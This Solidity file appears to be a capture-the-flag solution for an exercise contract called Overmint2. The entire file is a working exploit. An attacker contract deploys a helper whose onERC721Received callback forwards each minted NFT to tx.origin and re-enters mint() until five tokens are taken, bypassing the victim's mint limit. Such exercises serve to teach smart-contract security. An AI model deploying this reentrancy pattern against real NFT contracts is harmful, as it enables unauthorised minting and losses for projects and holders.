// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Overmint2.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint2Attacker {
    constructor(address addr) {
        A a = new A(addr);
        a.attack();
    }
}

contract A is IERC721Receiver {
    Overmint2 public victim;

    constructor(address addr) {
        victim = Overmint2(addr);
    }

    function onERC721Received(
        address sender,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        victim.transferFrom(address(this), tx.origin, tokenId);

        if (tokenId < 5) {
            victim.mint();
        }

        return this.onERC721Received.selector;
    }

    function attack() external {
        // count++;
        victim.mint();
    }
}
